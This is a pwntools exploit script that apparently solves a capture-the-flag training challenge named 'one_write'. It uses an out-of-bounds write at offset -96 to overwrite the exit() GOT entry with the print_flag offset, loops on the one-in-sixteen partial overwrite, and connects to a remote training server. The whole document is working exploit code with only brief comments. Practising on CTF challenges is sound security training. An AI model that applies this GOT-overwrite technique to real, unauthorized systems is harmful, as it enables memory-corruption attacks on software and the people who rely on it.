from pwn import *
CHALL_PATH = "./one_write"
COMMANDS = """
b main
c
"""

# try the address with a loop: 1/16 possibilities of correctness
while True:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    elif args.REMOTE:
        c = remote("one-write.training.offensivedefensive.it", 8080, ssl = True)
    else:
        c = process(CHALL_PATH)

    # overwrite the right number of bytes of the address
    c.recvuntil(b"Choice: ")
    c.send(b"2")

    # overwrite the value of exit() in GOT
    c.recvuntil(b"Offset: ")
    c.send(b"-96")

    # offset di print_flag(): 0x1329 (4905 in decimal)
    c.recvuntil(b"Value: ")
    c.send(b"4905")

    c.recvline() #final message

    try:
        response = c.recvline()  
        # Check if the response contains the flag
        if b"flag" in response:
            found = True
            print(response)  
            break  
        else:
            c.close()
    #if line not received: wrong address
    except EOFError:
        continue

c.interactive() 